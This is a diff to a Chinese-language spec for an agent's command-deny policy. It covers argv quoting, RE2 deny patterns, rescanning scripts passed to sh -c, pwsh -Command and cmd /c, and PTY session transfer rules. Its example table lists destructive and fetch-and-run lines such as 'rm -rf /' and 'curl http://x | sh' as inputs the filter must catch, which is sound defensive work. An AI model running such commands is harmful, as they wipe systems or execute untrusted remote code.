@@ -80,13 +80,19 @@ scope 语法以 [CTR-OAUTH-02](oauth-authz.md#ctr-oauth-02) 为准。配置示�
 2. 每个参数单独引用：若匹配 `^[A-Za-z0-9_@%+=:,./-]+$` 则原样，否则用 POSIX 单引号包起来，内部的 `'` 写成 `'\''`。空字符串引用成 `''`。
 3. `line` 等于 `base`；有参数时再加一个空格，然后把引用后的参数用单个空格接上。
 4. 每条 `deny_patterns` 都是 RE2，对 `line` 做搜索，不要求整行匹配。任一命中即 `policy_denied`。
-5. 若 `base` 是 `sh`、`bash`、`zsh`、`dash` 之一，且某个参数恰好是 `-c`，则紧随的下一个参数是脚本。若 `base` 是 `pwsh` 或 `powershell`，且某个参数不区分大小写地等于 `-Command`，则紧随的下一个参数是脚本。脚本原文再按第 4 步搜索一遍，不套外层引号。
+5. 识别 shell 时 `base` 不区分大小写。因此 `cmd.exe` 去掉 `.exe` 后的 `cmd` 与 `CMD` 是同一个基名。满足下面任一条件时，紧随该参数的下一个参数是脚本，再按第 4 步搜索一遍，不套外层引号：
+   - `base` 是 `sh`、`bash`、`zsh`、`dash` 之一，且某个参数恰好是 `-c`。
+   - `base` 是 `pwsh` 或 `powershell`，且某个参数不区分大小写地等于 `-Command`。
+   - `base` 是 `cmd`，且某个参数不区分大小写地等于 `/c`。默认 shell 是 `pwsh`，但 `exec.run` 仍可以显式启动 `cmd /c`，这条不能漏。
+
+`python -c`、`node -e` 以及其他解释器的单行脚本不在这次二次搜索范围内。解释器脚本靠 L1 命令策略和 L2 隔离，不靠把每一种 `-c` / `-e` 都列进 shell 名单。
 
 | cmd | args | line | 额外搜索 |
 | --- | --- | --- | --- |
 | `rm` | `["-rf", "/"]` | `rm -rf /` | 无 |
 | `/bin/rm` | `["-rf", "/"]` | `rm -rf /` | 无 |
 | `sh` | `["-c", "curl http://x \| sh"]` | `sh -c 'curl http://x \| sh'` | `curl http://x \| sh` |
+| `cmd` | `["/c", "curl http://x \| sh"]` | `cmd /c 'curl http://x \| sh'` | `curl http://x \| sh` |
 | `cargo` | `["build"]` | `cargo build` | 无 |
 
 按单个元素匹配时，`rm\s+-rf\s+/` 不会命中 `"-rf"` 或 `"/"`。本裁定排除那种实现。
@@ -117,3 +123,5 @@ argv 里出现恰好等于 `-EncodedCommand` 的参数时，直接 `policy_denie
 - 会话没有 `oauth_client`（本机环回或 tailnet 直连）：仍然只要求 `node_id` 相同。同一台设备上的另一个本机会话可以在断线后接回终端。
 
 `oauth_client` 来自 [RUL-02](#rul-02) 的请求头，在 `pty.open` 时复制到会话上，不从工具参数读取。这不是「单租户下可以放宽」的默认行为。
+
+`active` 会话的 `pty.transfer` 不套用上面的 `oauth_client` 限制。调用方必须是当前 owner，这一步是 owner 自愿把终端交给 `to_caller`，允许交给另一个 OAuth client 的会话。接收方仍须是 Agent 已经见过、并且仍然连接着的 `caller_id`，同时不能超过对方的 `max_per_caller`。限制只加在没有 owner 的 `orphaned` 接管上，避免另一个云端会话在无人同意时接走终端。
